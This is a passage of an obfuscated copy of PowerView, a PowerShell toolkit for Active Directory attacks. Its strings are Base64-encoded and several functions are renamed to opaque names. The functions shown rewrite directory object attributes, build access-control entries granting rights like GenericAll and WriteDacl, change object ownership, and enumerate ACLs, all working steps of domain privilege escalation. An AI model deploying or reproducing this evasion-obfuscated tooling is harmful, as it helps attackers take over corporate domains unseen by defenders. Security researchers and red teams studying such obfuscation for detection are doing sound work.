        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ${443} = f98 @48
        ForEach ($Object in ${443}) {
            ${441} = ${443}.GetDirectoryEntry()
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))].GetEnumerator() | % {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$(${443}.Properties.samaccountname)'"
                        ${441}.put($_.Name, $_.Value)
                    }
                    ${441}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$(${443}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | % {
                        ${451} = $_.Name
                        ${454} = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '${451}' with '${454}' for object '$(${443}.Properties.samaccountname)'"
                        ${452} = ${441}.${451}[0].GetType().name
                        ${453} = $(${441}.${451}) -bxor ${454}
                        ${441}.${451} = ${453} -as ${452}
                    }
                    ${441}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$(${443}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | % {
                        ${451} = $_
                        Write-Verbose "[Set-DomainObject] Clearing '${451}' for object '$(${443}.Properties.samaccountname)'"
                        ${441}.${451}.clear()
                    }
                    ${441}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$(${443}.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function ConvertFrom-LDAPLogonHours {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbgBjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function f114 {
            Param (
                [int[]]
                ${f28}
            )
            ${448} = New-Object bool[] 24
            for(${67}=0; ${67} -lt 3; ${67}++) {
                ${450} = ${f28}[${67}]
                ${f1} = ${67} * 8
                ${449} = [Convert]::ToString(${450},2).PadLeft(8,'0')
                ${448}[${f1}+0] = [bool] [convert]::ToInt32([string]${449}[7])
                ${448}[${f1}+1] = [bool] [convert]::ToInt32([string]${449}[6])
                ${448}[${f1}+2] = [bool] [convert]::ToInt32([string]${449}[5])
                ${448}[${f1}+3] = [bool] [convert]::ToInt32([string]${449}[4])
                ${448}[${f1}+4] = [bool] [convert]::ToInt32([string]${449}[3])
                ${448}[${f1}+5] = [bool] [convert]::ToInt32([string]${449}[2])
                ${448}[${f1}+6] = [bool] [convert]::ToInt32([string]${449}[1])
                ${448}[${f1}+7] = [bool] [convert]::ToInt32([string]${449}[0])
            }
            ${448}
        }
    }
    Process {
        ${134} = @{
            Sunday = f114 -f28 $LogonHoursArray[0..2]
            Monday = f114 -f28 $LogonHoursArray[3..5]
            Tuesday = f114 -f28 $LogonHoursArray[6..8]
            Wednesday = f114 -f28 $LogonHoursArray[9..11]
            Thurs = f114 -f28 $LogonHoursArray[12..14]
            Friday = f114 -f28 $LogonHoursArray[15..17]
            Saturday = f114 -f28 $LogonHoursArray[18..20]
        }
        ${134} = New-Object PSObject -Property ${134}
        ${134}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
        ${134}
    }
}
function New-ADObjectAccessControlEntry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,
        [Guid]
        $InheritedObjectType
    )
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            ${435} = @{
                'Identity' = $PrincipalIdentity
                'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${447} = f98 @435
            if (-not ${447}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
            }
            elseif(${447}.Count -gt 1) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcwAgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0ACAAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
            }
            ${438} = ${447}.objectsid
        }
        else {
            ${438} = $PrincipalIdentity
        }
        ${445} = 0
        foreach(${446} in $Right) {
            ${445} = ${445} -bor (([System.DirectoryServices.ActiveDirectoryRights]${446}).value__)
        }
        ${445} = [System.DirectoryServices.ActiveDirectoryRights]${445}
        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${438})
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${445}, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
        else {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${445}, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
    }
}
function Set-DomainObjectOwner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${444} = f98 @48 -Identity $OwnerIdentity -Properties objectsid | select -ExpandProperty objectsid
        if (${444}) {
            ${442} = [System.Security.Principal.SecurityIdentifier]${444}
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAG8AdwBuAGUAcgAgAGkAZABlAG4AdABpAHQAeQAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
        }
    }
    PROCESS {
        if (${442}) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            ${443} = f98 @48
            ForEach ($Object in ${443}) {
                try {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHMAZQB0ACAAdABoAGUAIABvAHcAbgBlAHIAIABmAG8AcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwAgAHQAbwAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
                    ${441} = ${443}.GetDirectoryEntry()
                    ${441}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))
                    ${441}.PsBase.ObjectSecurity.SetOwner(${442})
                    ${441}.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcwBlAHQAdABpAG4AZwAgAG8AdwBuAGUAcgA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function f112 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${f27},
        [Switch]
        $ResolveGUIDs,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))
        }
        else {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${31} = f74 @48
        ${440} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${440}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${440}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${440}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${440}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${440}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            ${430} = f113 @440
        }
    }
    PROCESS {
        if (${31}) {
            ${251} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                }
                elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
